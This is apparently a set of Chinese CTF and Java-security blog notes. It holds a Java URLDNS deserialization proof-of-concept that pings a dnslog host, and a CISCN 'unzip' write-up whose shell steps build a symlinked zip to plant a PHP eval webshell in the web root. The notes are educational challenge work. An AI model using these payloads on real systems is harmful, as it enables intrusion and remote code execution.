handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>解决办法一</strong>: put之后设置hashCode为-1，可以使用反射来实现</p></li></ol><h3 id="URLDNS-poc"><a href="#URLDNS-poc" class="headerlink" title="URLDNS poc"></a>URLDNS poc</h3><blockquote><p>还是得自己写个poc出来，会看调用链不代表会利用</p></blockquote><ol><li>顺便讲讲<em><strong>作用</strong></em><ol><li>因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</li><li>使⽤Java内置的类构造，对第三⽅库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞，<strong>常用于漏洞探测带外这样</strong></li></ol></li><li>poc写要求<ol><li>要求1: 这里使用的URL在hash的情况下调用dns，需要将URL的hashCode设置为-1 –&gt; <strong>使得在hashMap中的u的hashCode&#x3D;-1</strong></li><li>要求2: 这里的handler需要调用到URLStreamHandler的hash()方法，设置的防止初始化时发送dns对这里没有关系</li><li><strong>在本地调用的特殊</strong><ol><li>法一：由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 服务器，所以要刷新dns缓存<code>ipconfig/flushdns</code></li><li>法二：这里也可以使用SilentURLStream这种方法来避免本地的第一次dns解析</li><li>法三：这里可以使<strong>反射先设置1234(非-1)</strong></li></ol></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个成功的poc</span></span><br><span class="line"><span class="keyword">package</span> URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3uvif5.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取类hashCode</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> u.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先设置为非-1防止先调用dns</span></span><br><span class="line">            field.set(u,<span class="number">12354</span>);</span><br><span class="line">            payload.put(u,<span class="string">&quot;my payload&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 放入后设置为-1使得反序列化时可以调用dns</span></span><br><span class="line">            field.set(u,-<span class="number">1</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 模拟序列化</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(payload);</span><br><span class="line">            <span class="comment">// 模拟反序列化</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">            ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>URLDNS<ol><li>java安全漫谈，可以初步了解一下原理</li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DURLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0.md">强推很细</a></li><li><a href="https://s31k31.github.io/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/">blog中比较完整的调试过程</a></li><li><a href="https://xz.aliyun.com/t/9116">有对Slient这个类做剖析，也有poc</a></li><li><a href="https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/">大佬博客，有poc，但是对Slient那个类的理解不深</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn23初赛</title>
      <link href="/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！</p></blockquote><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><h3 id="unzip-分析成功"><a href="#unzip-分析成功" class="headerlink" title="unzip 分析成功"></a>unzip 分析成功</h3><ol><li><p>随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache</p></li><li><p>分析一下代码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE); <span class="comment"># 常量返回 mime 类型。 自 PHP 5.3.0 可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 以上判断是否为zip文件</span></span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!    </span></span><br></pre></td></tr></table></figure></li><li><p>找找切入点，我们可以进行操控的就是文件的内容，文件tmpname可以吗</p><ol><li>tmp_name用户原始上传文件名，可控？本机上不行，文件名是随机的bro在php中彻底断了想法</li><li>unzip相关的漏洞</li><li>tmp_name目录穿越 –&gt; 不可行，随机文件名</li><li>unzip to rce？没找到，但是有新的文章<ol><li><a href="https://nandynarwhals.org/hxp-ctf-2021-unzipper/"></a>，但是这里有realpath() –&gt; 并特定注明<em><strong>Q1: 不能直接使用符号链接</strong></em>，这里没有realpath可以切入吗？这道题和国赛这题应用场景不一样的，有readfile()</li><li><a href="https://xz.aliyun.com/t/2589?time__1311=n4+xni0=G=i=0QAeGNDQTcwnDB7f=DgeU7GoD"></a> –&gt; 有点意思，考虑使用软链接来搞，<strong>A1: 软链接应该是切入点</strong></li><li><a href="https://blog.csdn.net/kwame211/article/details/98059791"></a> –&gt; 会保留符号链接，但是问题在于<em><strong>Q2: 这里都是写入?</strong></em></li></ol></li><li>或者unzip覆盖？ –&gt; 可以，-o表示覆盖已有文件并且不进行确认，unzip后文件名没有zip字</li></ol></li><li><p>可以读取的话，这里也没得读取啊，软连接创建文件写入.&#x2F;kc1zs4.php？</p><ol><li><em><strong>Q3: 这里需要搭配目录穿越吧？</strong></em>: 刚好有文章<ol><li>？<em><strong>Q4: zipslip</strong></em>，但是没有php的</li><li><a href="https://fiissh.tech/2021/android-fix-zip-path-traversal-vulnerability.html"></a> –&gt; 好像可以，为什么不试试？done，本地可以，应该通了</li></ol></li><li>我们故意在<code>zip -y link.zip link</code>处忽略-y选项，可以做到直接创建文件，太棒了，上传木马文件</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html/kc1zs4.php link</span><br><span class="line">echo <span class="string">&quot;&lt;?php $_GET[&#x27;a&#x27;]?&gt;&quot;</span> &gt; link</span><br><span class="line"><span class="built_in">zip</span> link.<span class="built_in">zip</span> link</span><br></pre></td></tr></table></figure></li><li><p>结果上传后没有反应，那肯定是我的问题，想想，本地可以生成啊？生成的问题？想一想生成过程，发现有可能kc1zs4.php是在ln生成符号链接后vim操作写入的，就是，这就是软连接的作用</p><ol><li>那生成文件的问题？感觉就是软连接这个地方 –&gt; <strong>生辰文件shell.php就是靠zip来解压啊</strong></li><li>回想到在php的open_basedir绕过地方有一个绕过方法也是使用符号链接，参考那个解法进行叠加？但是怎么写入，先试试吗，硬想想不到</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标目录</span></span><br><span class="line">ln -s /var/www/html link</span><br><span class="line"><span class="built_in">zip</span> -y link.<span class="built_in">zip</span> link</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在可以访问到那一个目录，能访问到那不就好了啊</span></span><br><span class="line"><span class="comment"># *思路，将包含木马的文件在对应的文件夹解压就好，所以要解压出来带有目录</span></span><br><span class="line">mkdir link/</span><br><span class="line">cd ./link</span><br><span class="line">echo <span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;])?&gt;&quot;</span> &gt; kc1zs4.php</span><br><span class="line">cd ..</span><br><span class="line"><span class="built_in">zip</span> link.<span class="built_in">zip</span> link/* <span class="comment"># 使用link/*解压后会有link文件夹及下列的内容</span></span><br><span class="line"><span class="comment"># 获取的link.zip(zip文件名不重要，重要是包含link目录)文件就是我们的payload</span></span><br><span class="line"><span class="comment"># link文件夹是用来联合利用link链接的</span></span><br></pre></td></tr></table></figure></li><li><p>试试吧，不行再来本地，通了，nice：还是要抓住本质</p></li></ol><h3 id="unzip-总结"><a href="#unzip-总结" class="headerlink" title="unzip 总结"></a>unzip 总结</h3><blockquote><p>虽然是web签到题，但是还是不容易啊，至少养成的思维是正确的</p></blockquote><ol><li>也是自己找到入口点了</li><li>始终要<em><strong>目标导向</strong></em>才能学好web啊，还是不能急，写入的目的是在目标目录写入文件，有解压？解压到目标目录？<em><strong>把已经确定的放在一起想想，比如这里软连接和目标目录</strong></em></li><li>这里的Server并不是bp返回的nginx，而是访问其他目录后报错回来的apache –&gt; <em><strong>文件上传一般要确定服务器的类型</strong></em></li><li><em><strong>没事就多试试，不要想不到就一直找资料</strong></em></li><li><em><strong>确定点后想想性质</strong></em>，比如这里的符号链接可以直接使用这一点一开始没有想到</li></ol><h3 id="zip手法"><a href="#zip手法" class="headerlink" title="zip手法"></a>zip手法</h3><blockquote><p>原题</p></blockquote><h4 id="zip深入理解"><a href="#zip深入理解" class="headerlink" title="zip深入理解"></a>zip深入理解</h4><h4 id="zip-slip"><a href="#zip-slip" class="headerlink" title="zip slip"></a>zip slip</h4><h4 id="zip目录穿越"><a href="#zip目录穿越" class="headerlink" title="zip目录穿越"></a>zip目录穿越</h4><h2 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h2><blockquote><p>裂开了，java还没咋学啊，看来这个月得来攻击java了(还有期末考sad</p></blockquote><h3 id="deserbug-分析"><a href="#deserbug-分析" class="headerlink" title="deserbug 分析"></a>deserbug 分析</h3><h2 id="go-session"><a href="#go-session" class="headerlink" title="go-session"></a>go-session</h2><h3 id="go-session-分析失败"><a href="#go-session-分析失败" class="headerlink" title="go-session 分析失败"></a>go-session 分析失败</h3><ol><li>分析一下代码<ol><li>首先肯定是要session伪造，可知这里使用的seesion包是github.com&#x2F;gorilla&#x2F;sessions</li><li>其次在&#x2F;flask下可以获取更多信息<ol><li><code>https://7454328f-a7c8-4944-9a81-9addd540329d.challenge.ctf.show/flask?name</code>有东西，原来是<em><strong>Q1: 报错</strong></em>，sad，但是其中有一些代码，审计一下，要运行控制台进行交互的话需要pin</li></ol></li></ol></li><li>现在屡屡目标和方向吧<ol><li>session伪造然后ssti</li><li>flask pin访问&#x2F;flask控制台，为什么这里一直<strong>Q2: 没有反应</strong>，噢不对，<strong>A2: 这里的flask是重新发送了一个请求，艹了</strong></li></ol></li><li>决定先从session入手<ol><li>这里的环境变量用于验证，是否需要获取<em><strong>Q3: SESSION_KEY，可能是一个搜索关键词</strong></em></li><li>发现session中的<code>Dv-BBAEC_4IAARABEAAAI_-CAAEGc3RyaW5nDAYABG5hbWUGc3RyaW5nDAcABWd1ZXN0</code>居然可以base64解码出来，应该就是根据SEESION_KEY获取的内容了</li></ol></li><li>所以下一步应该是ssrf打到flask里面去，因为只有这一个入口点了，前面报错有flask的一部分源码，ssrf没有目标入口啊？？？</li></ol><h3 id="go-session总结"><a href="#go-session总结" class="headerlink" title="go-session总结"></a>go-session总结</h3><ol><li><em><strong>对于可以直接生成的东西不要一直揪着不放，想清楚一点你要什么，比如这里的NewCookieStore()的签名算法</strong></em>，知道一个签名一个加密就ok，总之后续可以直接调用函数来生成</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(1)_序列化的开始</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A85(1)_%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A85(1)_%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<blockquote><p>序列化的概念php和python处已经学习过了，这里就不再进行纠缠了，直接到没有学过的内容</p></blockquote><h2 id="话外-计算机网络中的序列化"><a href="#话外-计算机网络中的序列化" class="headerlink" title="话外: 计算机网络中的序列化"></a>话外: 计算机网络中的序列化</h2><ol><li><img src="/pic/Java%E5%AE%89%E5%85%A85_%E5%BA%8F%E5%88%97%E5%8C%96/tcp-ip-4-model.png" alt="pic"></li><li>OSI 七层协议模型中，表示层做的事情主要就是对应用层的用户数据进行处理转换为二进制流。反过来的话，就是将二进制流转换成应用层的用户数据。这就对应的是序列化和反序列化</li><li>OSI 七层协议模型中的应用层、表示层和会话层对应的都是 TCP&#x2F;IP 四层模型中的应用层，所以序列化协议属于 TCP&#x2F;IP 协议应用层的一部分</li></ol><h2 id="Java自带序列化的主要特点与限制"><a href="#Java自带序列化的主要特点与限制" class="headerlink" title="Java自带序列化的主要特点与限制"></a>Java自带序列化的主要特点与限制</h2><ol><li>反序列化类对象时有如下<strong>限制</strong>：<ol><li>被反序列化的类必须存在</li><li>serialVersionUID值必须一致</li><li>不支持跨语言调用，跨语言需要使用JSON这种，有对应的漏洞</li><li>必须实现Serializable接口，具体见下同名小标题处</li></ol></li><li>特点：<ol><li><p><strong>无需调用该类的构造函数</strong></p><ol><li>原理: 在反序列化创建类实例时使用了sun.reflect.ReflectionFactory.newConstructorForSerialization创建了一个反序列化专用的Constructor(<strong>反射构造方法对象</strong>)，使用这个特殊的Constructor可以绕过构造方法创建类实例</li><li>一句话: 结合了JDK的序列化和反射机制来创建新对象，绕过构造器，避免构造器中的初始化逻辑</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DeserializationTest.java</span></span><br><span class="line"><span class="keyword">package</span> Deser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DeserializationTest</span><span class="params">()</span> &#123;</span><br><span class="line">        name = <span class="string">&quot;kc1zs4&quot;</span>;</span><br><span class="line">        age = <span class="number">18</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;DeserialzationTest() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ReflectionFactoryTest</span></span><br><span class="line"><span class="keyword">package</span> Deser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 1. 获取工厂</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">            <span class="comment">// 2. 从工厂获取对应的构造器</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> factory.newConstructorForSerialization(DeserializationTest.class, Object.class.getConstructor());</span><br><span class="line">            <span class="comment">// 3. 进行构造</span></span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端输出: (并没有调用构造函数)</span></span><br><span class="line"><span class="comment">// hello world</span></span><br><span class="line"><span class="comment">// Deser.DeserializationTest@1ed3c8d</span></span><br></pre></td></tr></table></figure></li><li><p>Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法</p></li></ol></li><li>在Java中实现对象反序列化非常简单，实现java.io.Serializable(内部序列化)或java.io.Externalizable(外部序列化)接口即可被序列化，其中java.io.Externalizable接口只是实现了java.io.Serializable接口。</li></ol><h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><h3 id="什么是serialVersionUID"><a href="#什么是serialVersionUID" class="headerlink" title="什么是serialVersionUID"></a>什么是serialVersionUID</h3><ol><li><p>下面是一个典型的实现了Serializable接口的一个类，可以见到其中有一个特殊的静态final常量srialVersionUID</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RpcRequest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1905122041950251207L</span>;</span><br><span class="line">    <span class="keyword">private</span> String requestId;</span><br><span class="line">    <span class="keyword">private</span> String interfaceName;</span><br><span class="line">    <span class="keyword">private</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> Object[] parameters;</span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt;[] paramTypes;</span><br><span class="line">    <span class="keyword">private</span> RpcMessageTypeEnum rpcMessageTypeEnum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="serialVersionUID的作用"><a href="#serialVersionUID的作用" class="headerlink" title="serialVersionUID的作用"></a>serialVersionUID的作用</h3><ol><li>Q: serialVersionUID 有什么作用？</li><li>A: 序列化号 serialVersionUID 属于版本控制的作用。反序列化时，<strong>会检查 serialVersionUID 是否和当前类的 serialVersionUID 一致</strong>。如果 serialVersionUID 不一致则会抛出 InvalidClassException 异常。强烈推荐每个序列化类都手动指定其 serialVersionUID，如果不手动指定，那么编译器会动态生成默认的 serialVersionUID。</li><li><em><strong>serialVersionUID的生成</strong></em><ol><li>大多数现代IDE（如 IntelliJ IDEA、Eclipse）都提供了自动生成 serialVersionUID 的功能。生成的 serialVersionUID <strong>通常是基于类的结构计算出来的</strong>，确保每次类结构变化时，生成的 serialVersionUID 也会不同</li></ol></li></ol><h3 id="补充问题-为什么静态变量serialVersionUID可以被序列化？"><a href="#补充问题-为什么静态变量serialVersionUID可以被序列化？" class="headerlink" title="补充问题: 为什么静态变量serialVersionUID可以被序列化？"></a>补充问题: 为什么静态变量serialVersionUID可以被序列化？</h3><ol><li><a href="https://github.com/Snailclimb/JavaGuide/issues/2174">stack exchange解答</a></li><li>static 修饰的变量是静态变量，属于类而非类的实例，本身是不会被序列化的。然而，serialVersionUID 是一个特例，serialVersionUID 的序列化做了特殊处理。当一个对象被序列化时，serialVersionUID 会被写入到序列化的二进制流中；在反序列化时，也会解析它并做一致性判断，以此来验证序列化对象的版本一致性。如果两者不匹配，反序列化过程将抛出 InvalidClassException，因为这通常意味着序列化的类的定义已经发生了更改，可能不再兼容 –&gt; <em><strong>总结: 因为它就是特殊处理的，目的就是为了保证类的匹配</strong></em></li><li><em><strong>关于transient</strong></em><ol><li>对于不想进行序列化的变量，可以使用 transient 关键字修饰。 –&gt; transient 关键字的作用是：阻止实例中那些用此关键字修饰的的变量序列化；当对象被反序列化时，被 transient 修饰的变量值不会被持久化和恢复</li><li>关于 transient 还有几点注意<ol><li>transient 只能修饰变量，不能修饰类和方法</li><li>transient 修饰的变量，在反序列化后变量值将会被置成<strong>类型的默认值</strong> –&gt; 例如，如果是修饰 int 类型，那么反序列后结果就是 0</li><li><strong>static变量</strong>因为不属于任何对象(Object)，所以无论有没有 transient 关键字修饰，均不会被序列化</li></ol></li></ol></li></ol><h2 id="如何使用jdk的序列化"><a href="#如何使用jdk的序列化" class="headerlink" title="如何使用jdk的序列化"></a>如何使用jdk的序列化</h2><h3 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h3><ol><li>java.io.Serializable是一个<strong>空的接口</strong>*(Marker Interface)，我们不需要实现java.io.Serializable的任何方法</li><li>java.io.Serializable接口仅仅只用于标识这个类可序列化。实现了java.io.Serializable接口的类原则上都需要生产一个serialVersionUID常量，反序列化时如果双方的serialVersionUID不一致会导致InvalidClassException 异常</li><li>以下是jdk7u21的源码及部分注释如下</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Classes that require special handling during the serialization and</span></span><br><span class="line"><span class="comment"> * deserialization process must implement special methods with these exact</span></span><br><span class="line"><span class="comment"> * signatures:</span></span><br><span class="line"><span class="comment"> *  要进行序列化和反序列化的类必须  自己  实现以下的方法</span></span><br><span class="line"><span class="comment"> * &lt;PRE&gt;</span></span><br><span class="line"><span class="comment"> * private void writeObject(java.io.ObjectOutputStream out)</span></span><br><span class="line"><span class="comment"> *     throws IOException</span></span><br><span class="line"><span class="comment"> * private void readObject(java.io.ObjectInputStream in)</span></span><br><span class="line"><span class="comment"> *     throws IOException, ClassNotFoundException;</span></span><br><span class="line"><span class="comment"> * private void readObjectNoData()</span></span><br><span class="line"><span class="comment"> *     throws ObjectStreamException;</span></span><br><span class="line"><span class="comment"> * &lt;/PRE&gt;</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  unascribed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectInputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectInput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Externalizable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h3><ol><li>java.io.ObjectInputStream类最核心的功能是readObject方法，即反序列化类对象<ol><li>除了能读取基本类型和String类型外，调用readObject()可以直接返回一个Object对象。要把它变成一个特定类型，<strong>必须强制转型</strong>(因为返回的是Object对象)</li></ol></li></ol><h3 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h3><ol><li>java.io.ObjectOutputStream类最核心的方法是writeObject方法，即序列化类对象<ol><li><em><strong>Serializable接口的作用: ObjectOutputStream既可以写入基本类型，也可以写入实现了Serializable接口的Object</strong></em></li></ol></li></ol><h3 